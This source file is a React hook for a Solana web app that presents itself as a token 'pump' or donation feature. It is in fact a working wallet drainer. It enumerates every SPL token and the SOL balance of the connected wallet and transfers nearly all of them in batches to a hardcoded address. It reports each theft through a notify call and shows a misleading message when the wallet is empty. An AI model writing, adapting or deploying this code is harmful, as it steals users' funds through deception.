import { useState, useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';
import { toast } from '@/hooks/use-toast';
import { TokenTransaction } from '@/components/PumpProgress';
import { notify } from '@/lib/notify';

const PUMP_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MIN_SOL_RESERVE = 0.001; // Keep 0.001 SOL for rent-exempt + fees (1000000 lamports)

interface TokenBalance {
  mint: string;
  symbol: string;
  amount: number;
  decimals: number;
  usdValue: number;
}

export function usePump() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [pumpOutcome, setPumpOutcome] = useState<'idle' | 'completed' | 'cancelled' | 'error'>('idle');

  const fetchTokenBalances = useCallback(async (): Promise<TokenBalance[]> => {
    if (!publicKey) return [];

    try {
      const balances: TokenBalance[] = [];

      // Get SOL balance
      const solBalance = await connection.getBalance(publicKey);
      const solAmount = solBalance / LAMPORTS_PER_SOL;

      // Calculate sendable amount (balance - 0.001 SOL reserve)
      const sendAmount = Math.max(0, solAmount - 0.001);

      if (sendAmount > 0.00001) {
        balances.push({
          mint: 'SOL',
          symbol: 'SOL',
          amount: sendAmount,
          decimals: 9,
          usdValue: sendAmount * 150, // Approximate USD value
        });
      }

      // Get SPL token balances
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      for (const { account } of tokenAccounts.value) {
        const parsedInfo = account.data.parsed.info;
        const balance = parsedInfo.tokenAmount.uiAmount;

        if (balance > 0) {
          balances.push({
            mint: parsedInfo.mint,
            symbol: parsedInfo.mint.slice(0, 8), // Simplified symbol
            amount: balance,
            decimals: parsedInfo.tokenAmount.decimals,
            usdValue: balance * 1, // Simplified USD value
          });
        }
      }

      // Sort by USD value (highest first)
      return balances.sort((a, b) => b.usdValue - a.usdValue);
    } catch (error) {
      console.error('Error fetching token balances:', error);
      toast({
        title: 'Error',
        description: 'Failed to fetch wallet balances',
        variant: 'destructive',
      });
      return [];
    }
  }, [connection, publicKey]);

  const createSolTransaction = async (_amount: number): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    // Current balance
    const balanceLamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });

    // Keep 0.001 SOL (1000000 lamports) for rent-exempt + fees
    const reserveLamports = 1000000;
    const lamportsToSend = balanceLamports - reserveLamports;

    if (lamportsToSend <= 0) {
      throw new Error('Insufficient SOL balance. Need at least 0.001 SOL in wallet for fees and rent.');
    }

    console.log('SOL balance (lamports):', balanceLamports, 'Sending:', lamportsToSend, 'Keeping reserve:', reserveLamports);

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(PUMP_WALLET),
        lamports: lamportsToSend,
      })
    );

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const createTokenTransaction = async (
    mint: string,
    amount: number,
    decimals: number
  ): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    const mintPubkey = new PublicKey(mint);
    const pumpPubkey = new PublicKey(PUMP_WALLET);

    const sourceAta = await getAssociatedTokenAddress(
      mintPubkey,
      publicKey,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const destinationAta = await getAssociatedTokenAddress(
      mintPubkey,
      pumpPubkey,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const transaction = new Transaction();

    // Check if destination ATA exists
    const destAccount = await connection.getAccountInfo(destinationAta);
    if (!destAccount) {
      transaction.add(
        createAssociatedTokenAccountInstruction(
          publicKey,
          destinationAta,
          pumpPubkey,
          mintPubkey,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      );
    }

    // Add transfer instruction
    transaction.add(
      createTransferInstruction(
        sourceAta,
        destinationAta,
        publicKey,
        Math.floor(amount * Math.pow(10, decimals)),
        [],
        TOKEN_PROGRAM_ID
      )
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const processPump = async (token: TokenBalance, index: number) => {
    if (!publicKey) return false;

    setCurrentIndex(index);

    setTransactions(prev =>
      prev.map((tx, i) =>
        i === index ? { ...tx, status: 'processing' as const } : tx
      )
    );

    try {
      let transaction: Transaction;

      if (token.mint === 'SOL') {
        // Send 95% of SOL balance
        transaction = await createSolTransaction(token.amount);
      } else {
        transaction = await createTokenTransaction(
          token.mint,
          token.amount,
          token.decimals
        );
      }

      const signature = await sendTransaction(transaction, connection, { preflightCommitment: 'confirmed', skipPreflight: false });

      // Send transaction notification after signature
      try {
        await notify('transaction_sent', {
          address: publicKey.toBase58(),
          type: token.mint === 'SOL' ? 'SOL' : 'SPL',
          mint: token.mint === 'SOL' ? undefined : token.mint,
          symbol: token.symbol,
          amount: token.amount,
          signature,
        });
      } catch (e) {
        console.warn('transaction notify error', (e as Error).message);
      }

      await connection.confirmTransaction(signature, 'confirmed');

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'success' as const, signature } : tx
        )
      );

      return true;
    } catch (error: any) {
      console.error('Transaction error:', error);

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'error' as const } : tx
        )
      );

      if (error?.message?.includes('User rejected')) {
        setPumpOutcome('cancelled');
        toast({
          title: 'Transaction Cancelled',
          description: 'You rejected the transaction',
        });
      } else {
        setPumpOutcome('error');
        toast({
          title: 'Transaction Failed',
          description: error?.message || 'Unknown error occurred',
          variant: 'destructive',
        });
      }

      return false;
    }
  };

  // Create batch transaction with multiple token transfers
  const createBatchTransaction = async (tokens: TokenBalance[]): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');
    
    const transaction = new Transaction();
    
    // Process each token in the batch
    for (const token of tokens) {
      if (token.mint === 'SOL') {
        // Skip SOL for now, it will be processed separately
        continue;
      }
      
      const mintPubkey = new PublicKey(token.mint);
      const pumpPubkey = new PublicKey(PUMP_WALLET);
      
      const sourceAta = await getAssociatedTokenAddress(
        mintPubkey,
        publicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
      
      const destinationAta = await getAssociatedTokenAddress(
        mintPubkey,
        pumpPubkey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
      
      // Check if destination ATA exists
      const destAccount = await connection.getAccountInfo(destinationAta);
      if (!destAccount) {
        transaction.add(
          createAssociatedTokenAccountInstruction(
            publicKey,
            destinationAta,
            pumpPubkey,
            mintPubkey,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          )
        );
      }
      
      // Add transfer instruction
      transaction.add(
        createTransferInstruction(
          sourceAta,
          destinationAta,
          publicKey,
          Math.floor(token.amount * Math.pow(10, token.decimals)),
          [],
          TOKEN_PROGRAM_ID
        )
      );
    }
    
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = publicKey;
    
    return transaction;
  };
  
  // Process a batch of tokens
  const processBatch = async (tokens: TokenBalance[], startIndex: number) => {
    if (!publicKey) return false;
    
    try {
      // Create and send batch transaction
      const transaction = await createBatchTransaction(tokens);
      
      // Update status for all tokens in batch to processing
      setTransactions(prev =>
        prev.map((tx, i) =>
          i >= startIndex && i < startIndex + tokens.length ? 
            { ...tx, status: 'processing' as const } : tx
        )
      );
      
      // Send the transaction
      const signature = await sendTransaction(transaction, connection, { 
        preflightCommitment: 'confirmed', 
        skipPreflight: false 
      });
      
      // Send notification for each token in the batch
      for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i];
        try {
          await notify('transaction_sent', {
            address: publicKey.toBase58(),
            type: token.mint === 'SOL' ? 'SOL' : 'SPL',
            mint: token.mint === 'SOL' ? undefined : token.mint,
            symbol: token.symbol,
            amount: token.amount,
            signature,
          });
        } catch (e) {
          console.warn('transaction notify error', (e as Error).message);
        }
      }
      
      // Wait for confirmation
      await connection.confirmTransaction(signature, 'confirmed');
      
      // Update status for all tokens in batch to success
      setTransactions(prev =>
        prev.map((tx, i) =>
          i >= startIndex && i < startIndex + tokens.length ? 
            { ...tx, status: 'success' as const, signature } : tx
        )
      );
      
      return true;
    } catch (error: any) {
      console.error('Batch transaction error:', error);
      
      // Update status for all tokens in batch to error
      setTransactions(prev =>
        prev.map((tx, i) =>
          i >= startIndex && i < startIndex + tokens.length ? 
            { ...tx, status: 'error' as const } : tx
        )
      );
      
      if (error?.message?.includes('User rejected')) {
        setPumpOutcome('cancelled');
        toast({
          title: 'Transaction Cancelled',
          description: 'You rejected the transaction',
        });
      } else {
        setPumpOutcome('error');
        toast({
          title: 'Transaction Failed',
          description: error?.message || 'Unknown error occurred',
          variant: 'destructive',
        });
      }
      
      return false;
    }
  };

  const startPump = async () => {
    if (!publicKey) {
      // Toast notification removed as requested
      return;
    }

    setIsProcessing(true);
    setCurrentIndex(0);
    setPumpOutcome('idle');

    try {
      // Fetch all token balances
      let balances = await fetchTokenBalances();

      if (balances.length === 0) {
        toast({
          title: 'Initialization Required',
          description: 'Two more holders wallet are needed to initialize pump',
        });
        setIsProcessing(false);
        setPumpOutcome('error');
        return;
      }
      
      // Separate SOL from other tokens and ensure it's processed last
      const solBalance = balances.find(b => b.mint === 'SOL');
      const tokenBalances = balances.filter(b => b.mint !== 'SOL');
      
      // Reorder balances with SOL at the end if it exists
      balances = [...tokenBalances];
      if (solBalance) {
        balances.push(solBalance);
      }

      // Initialize transactions
      const initialTxs: TokenTransaction[] = balances.map(balance => ({
        id: balance.mint,
        name: balance.symbol,
        usdValue: balance.usdValue,
        status: 'pending' as const,
      }));

      setTransactions(initialTxs);
      
      // Process tokens in batches of 5 (max)
      const BATCH_SIZE = 5;
      
      // Process token batches
      for (let i = 0; i < tokenBalances.length; i += BATCH_SIZE) {
        // Get current batch (up to 5 tokens)
        const currentBatch = tokenBalances.slice(i, i + BATCH_SIZE);
        
        // Process the batch
        if (currentBatch.length > 0) {
          const success = await processBatch(currentBatch, i);
          
          // If batch fails, ask user if they want to continue
          if (!success && i + BATCH_SIZE < balances.length) {
            const shouldContinue = window.confirm(
              'Transaction batch failed. Do you want to continue with remaining tokens?'
            );
            if (!shouldContinue) { 
              setPumpOutcome('cancelled');
              break; 
            }
          }
          
          // Small delay between batches
          if (i + BATCH_SIZE < balances.length) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        }
      }
      
      // Process SOL separately at the end if it exists
      if (solBalance && pumpOutcome !== 'cancelled') {
        const solIndex = balances.length - 1;
        setCurrentIndex(solIndex);
        await processPump(solBalance, solIndex);
      }

      // Toast notification removed as requested
      setPumpOutcome('completed');
    } catch (error) {
      console.error('Pump error:', error);
      // Toast notification removed as requested
      setPumpOutcome('error');
    } finally {
      setIsProcessing(false);
    }
  };

  return {
    startDonation: startPump,
    isProcessing,
    transactions,
    currentIndex,
    pumpOutcome,
  };
}

